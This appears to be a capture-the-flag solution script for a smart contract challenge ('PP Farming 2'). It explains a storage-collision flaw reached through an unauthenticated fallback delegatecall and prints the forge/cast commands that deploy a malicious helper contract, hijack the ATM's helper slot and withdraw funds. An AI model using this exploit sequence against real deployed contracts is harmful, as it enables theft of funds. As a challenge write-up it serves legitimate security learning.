#!/usr/bin/env python3
"""
PP Farming 2 - storage collision via unauthenticated fallback delegatecall
setATM(evilHelper) reachable through ATM's fallback aliases ATM's own
performancePointHelper storage slot (slot 1 in both contracts).
"""
import sys
from web3 import Web3

# --- config: fill from challenge instance ---
RPC_URL    = "http://REPLACE_RPC"
PLAYER_KEY = "REPLACE_PRIVKEY"
ATM_ADDR   = Web3.to_checksum_address("REPLACE_ATM")

w3 = Web3(Web3.HTTPProvider(RPC_URL))
player = w3.eth.account.from_key(PLAYER_KEY)

print(f"Player:  {player.address}")
print(f"Balance: {w3.from_wei(w3.eth.get_balance(player.address), 'ether')} ETH")
print(f"ATM bal: {w3.from_wei(w3.eth.get_balance(ATM_ADDR), 'ether')} ETH")

print("\nQuick forge/cast commands (verified live):")
print(f"  forge create --rpc-url {RPC_URL} --private-key $PK --broadcast src/Evil.sol:EvilHelper")
print(f"  cast send {ATM_ADDR} 'setATM(address)' $EVIL --rpc-url {RPC_URL} --private-key $PK")
print(f"  cast call {ATM_ADDR} 'performancePointHelper()(address)' --rpc-url {RPC_URL}")
print(f"  cast send {ATM_ADDR} 'donatePP(address)' $PLAYER --value 0.01ether --rpc-url {RPC_URL} --private-key $PK")
print(f"  cast send {ATM_ADDR} 'withdrawPP()' --rpc-url {RPC_URL} --private-key $PK")
print(f"  cast call {ATM_ADDR} 'isSolved()(bool)' --rpc-url {RPC_URL}")
